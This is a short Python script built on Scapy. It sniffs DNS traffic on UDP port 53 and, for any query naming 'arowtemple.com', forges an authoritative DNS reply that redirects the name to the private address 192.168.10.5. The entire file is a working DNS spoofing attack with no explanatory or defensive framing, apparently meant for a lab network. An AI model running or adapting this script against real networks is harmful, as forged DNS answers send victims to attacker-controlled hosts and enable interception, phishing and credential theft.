from scapy.all import *

def spoof_dns(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname
        if "arowtemple.com" in qname.decode():
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=100, rdata="192.168.10.5"))
            send(spoofed_pkt, verbose=False)
            print("success")


def main():
    try: 
        sniff(filter="udp and port 53", prn=spoof_dns, store=0)
    except KeyboardInterrupt:
    	print("terminated dns spoofing")
    	
if __name__ == '__main__':
    main()
